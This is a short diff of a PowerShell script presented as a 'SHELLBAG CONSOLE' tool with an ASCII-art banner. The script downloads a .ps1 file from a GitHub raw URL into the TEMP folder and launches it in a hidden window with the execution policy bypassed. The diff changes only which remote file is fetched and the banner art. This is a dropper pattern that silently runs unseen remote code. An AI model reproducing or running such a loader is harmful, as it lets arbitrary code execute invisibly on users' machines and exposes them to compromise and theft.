@@ -1,6 +1,6 @@
 $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
-$url = "https://github.com/sys1e/cmd/raw/refs/heads/main/123.ps1"
-$path = "$env:TEMP\123.ps1"
+$url = "https://github.com/sys1e/catl/raw/refs/heads/main/Bag.ps1"
+$path = "$env:TEMP\Bag.ps1"
 try {
     Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
     Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
@@ -8,8 +8,8 @@ try {
 Clear-Host
 function Show-KRAKEH-Header {
     $headerArt = @"
-NO!                          MNO!
-     MNO!!         [NBK]          MNNOO!
+       NO!                       MNO!
+     MNO!!                        MNNOO!
    MMNO!                           MNNOO!!
  MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!!
  !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO!
